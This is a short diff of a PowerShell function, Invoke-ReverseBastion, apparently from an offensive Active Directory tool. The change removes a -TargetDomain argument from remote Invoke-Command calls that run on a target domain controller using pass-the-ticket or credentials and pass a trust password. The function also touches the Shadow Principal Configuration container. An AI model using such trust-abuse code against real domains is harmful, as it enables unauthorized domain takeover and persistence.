@@ -132,9 +132,9 @@ function Invoke-ReverseBastion {
     }
 
     if ($PTT) {
-        Invoke-Command -ComputerName $TargetDC -ScriptBlock $block -ArgumentList "-BastionDomain $CurrentDomain -TargetDomain $TargetDomain -trustpass $trustpass"
+        Invoke-Command -ComputerName $TargetDC -ScriptBlock $block -ArgumentList "-BastionDomain $CurrentDomain -trustpass $trustpass"
     } else {
-        Invoke-Command -ComputerName $TargetDC -Credential $Credential -ScriptBlock $block -ArgumentList "-BastionDomain $CurrentDomain -TargetDomain $TargetDomain -trustpass $trustpass"
+        Invoke-Command -ComputerName $TargetDC -Credential $Credential -ScriptBlock $block -ArgumentList "-BastionDomain $CurrentDomain -trustpass $trustpass"
     }
 
     $shadowcontainer = "CN=Shadow Principal Configuration,CN=Services,$((Get-ADRootDSE).ConfigurationNamingContext)"
